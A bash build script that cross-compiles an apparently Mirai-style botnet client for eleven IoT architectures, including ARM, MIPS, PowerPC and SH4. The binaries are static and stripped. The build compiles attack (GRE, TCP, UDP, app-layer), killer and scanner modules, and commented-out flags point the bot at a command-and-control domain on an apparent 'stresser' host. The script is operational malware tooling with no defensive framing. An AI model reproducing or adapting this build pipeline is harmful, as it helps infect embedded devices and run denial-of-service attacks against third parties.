#!/bin/bash

# Bot Cross-Compilation Script for uClibc Toolchains
# This script compiles the bot source code for multiple architectures using uClibc cross-compilers

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
BOT_SOURCE_DIR="/root/bot"
OUTPUT_DIR="/root/binaries"
CROSS_COMPILER_DIR="/etc/xcompiler"

# Create output directory
mkdir -p "$OUTPUT_DIR"

echo -e "${BLUE}=== Bot Cross-Compilation Script ===${NC}"
echo -e "${YELLOW}Source Directory: $BOT_SOURCE_DIR${NC}"
echo -e "${YELLOW}Output Directory: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}Cross-Compiler Directory: $CROSS_COMPILER_DIR${NC}"
echo
echo -e "${BLUE}=== Special Build Requirements Found ===${NC}"
echo -e "${YELLOW}1. DEBUG flag: Controls debug output (disabled for production)${NC}"
echo -e "${YELLOW}2. USEDOMAIN flag: Enables domain resolution (requires SERVDOM/SCANDOM)${NC}"
echo -e "${YELLOW}3. Static linking: Required for embedded systems${NC}"
echo -e "${YELLOW}4. Size optimization: Critical for IoT devices${NC}"
echo -e "${YELLOW}5. Stack protection disabled: For embedded compatibility${NC}"
echo

# Function to check if cross-compiler exists
check_compiler() {
    local arch=$1
    local compiler_path="$CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc"
    
    if [ ! -f "$compiler_path" ]; then
        echo -e "${RED}ERROR: Cross-compiler for $arch not found at $compiler_path${NC}"
        return 1
    fi
    return 0
}


# Function to compile for specific architecture
compile_arch() {
    local arch=$1
    local compiler_name=$2
    local output_name=$3
    
    echo -e "${BLUE}Compiling for $arch...${NC}"
    
    # Check if compiler exists
    if ! check_compiler "$arch"; then
        echo -e "${RED}Skipping $arch - compiler not found${NC}"
        return 1
    fi
    
    # Set up compiler paths
    local CC="$CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc"
    local STRIP="$CROSS_COMPILER_DIR/$arch/bin/${arch}-strip"
    
    # Basic compiler flags for uClibc
    local CFLAGS="-static -Os -std=c99 -D_GNU_SOURCE"
    local LDFLAGS="-static"
    
    # Domain configuration - use hardcoded IP (SERVIP) instead of domain resolution
    # CFLAGS="$CFLAGS -DUSEDOMAIN"
    # CFLAGS="$CFLAGS -DSERVDOM=\\\"bigbomboclaat.corestresser.cc\\\""
    # CFLAGS="$CFLAGS -DSCANDOM=\\\"bigbomboclaat.corestresser.cc\\\""
    
    # Additional flags for specific architectures
    case $arch in
        "armv4l"|"armv5l"|"armv6l"|"armv7l")
            CFLAGS="$CFLAGS -march=armv4t -mtune=arm9tdmi -O2"
            ;;
        "mips"|"mipsel")
            CFLAGS="$CFLAGS -march=mips32 -mtune=mips32 -O2"
            ;;
        "i586")
            CFLAGS="$CFLAGS -march=i586 -mtune=i586 -O2"
            ;;
        "m68k")
            # M68K may not support -march/-mtune flags, use basic optimization
            CFLAGS="$CFLAGS -O2"
            ;;
        "powerpc")
            # PowerPC doesn't support -march/-mtune flags, use basic optimization
            CFLAGS="$CFLAGS -O2"
            ;;
        "sh4")
            # SH4 doesn't support -march/-mtune flags, use basic optimization
            CFLAGS="$CFLAGS -O2"
            ;;
        "sparc")
            # SPARC may not support -march/-mtune flags, use basic optimization
            CFLAGS="$CFLAGS -O2"
            ;;
    esac
    
    # Compile the bot
    echo -e "${YELLOW}Using compiler: $CC${NC}"
    echo -e "${YELLOW}Flags: $CFLAGS $LDFLAGS${NC}"
    
    cd "$BOT_SOURCE_DIR"
    
    # Compile with all source files
    echo -e "${YELLOW}Compiling source files...${NC}"
    
    # Compile with error handling and conditional compilation flags
    if ! $CC $CFLAGS -Dkwari_KILLER -Dkwari_IOCTL -Dkwari_SCANNER -o "$OUTPUT_DIR/$output_name" \
        main.c \
        attack.c \
        attack_app.c \
        attack_gre.c \
        attack_tcp.c \
        attack_udp.c \
        buff.c \
        checksum.c \
        killer.c \
        rand.c \
        resolv.c \
        scanner.c \
        table.c \
        util.c \
        $LDFLAGS 2>&1; then
        echo -e "${RED}Compilation failed for $arch${NC}"
        return 1
    fi
    
    # Strip the binary to reduce size
    if [ -f "$STRIP" ]; then
        $STRIP "$OUTPUT_DIR/$output_name"
        echo -e "${GREEN}Stripped binary: $output_name${NC}"
    fi
    
    # Get binary size
    local size=$(stat -c%s "$OUTPUT_DIR/$output_name" 2>/dev/null || echo "unknown")
    echo -e "${GREEN}Successfully compiled $arch -> $output_name (${size} bytes)${NC}"
    echo
}

# Function to create a simple test script
create_test_script() {
    local test_script="$OUTPUT_DIR/test_binaries.sh"
    
    cat > "$test_script" << 'EOF'
#!/bin/bash

# Test script for compiled bot binaries
echo "=== Bot Binary Test Script ==="
echo "This script tests the compiled bot binaries"
echo

BINARY_DIR="/root/binaries"

echo "Available binaries:"
ls -la "$BINARY_DIR"/* 2>/dev/null || echo "No binaries found"

echo
echo "Binary information:"
for binary in "$BINARY_DIR"/*; do
    if [ -f "$binary" ]; then
        echo "File: $(basename "$binary")"
        echo "Size: $(stat -c%s "$binary") bytes"
        echo "Type: $(file "$binary")"
        echo "---"
    fi
done

echo
echo "Note: These binaries are designed for specific architectures."
echo "Do not run them on incompatible systems."
EOF
    
    chmod +x "$test_script"
    echo -e "${GREEN}Created test script: $test_script${NC}"
}

# Main compilation process
echo -e "${BLUE}Starting compilation process...${NC}"
echo

# List of architectures to compile for
declare -A ARCHITECTURES=(
    ["i586"]="i586"
    ["m68k"]="m68k" 
    ["mips"]="mips"
    ["mipsel"]="mipsel"
    ["powerpc"]="powerpc"
    ["sh4"]="sh4"
    ["sparc"]="sparc"
    ["armv4l"]="armv4l"
    ["armv5l"]="armv5l"
    ["armv6l"]="armv6l"
    ["armv7l"]="armv7l"
)

# Compile for each architecture
for arch in "${!ARCHITECTURES[@]}"; do
    compiler_name="${ARCHITECTURES[$arch]}"
    output_name="bot.${arch}"
    
    echo -e "${BLUE}=== Compiling for $arch ===${NC}"
    compile_arch "$arch" "$compiler_name" "$output_name"
done

# Create test script
create_test_script

# Summary
echo -e "${GREEN}=== Compilation Summary ===${NC}"
echo -e "${YELLOW}Output directory: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}Compiled binaries:${NC}"
ls -la "$OUTPUT_DIR"/* 2>/dev/null || echo "No binaries found"

echo
echo -e "${BLUE}=== Usage Instructions ===${NC}"
echo "1. The compiled binaries are in: $OUTPUT_DIR"
echo "2. Each binary is named: bot.<architecture>"
echo "3. Use the appropriate binary for the target architecture"
echo "4. Run test_binaries.sh to get information about compiled binaries"
echo
echo -e "${YELLOW}Important Notes:${NC}"
echo "- These binaries are statically linked and should run on target systems"
echo "- Do not run binaries on incompatible architectures"
echo "- The binaries are stripped to reduce size"
echo "- All binaries are compiled with optimization flags for embedded systems"
echo
echo -e "${GREEN}Compilation process completed!${NC}"
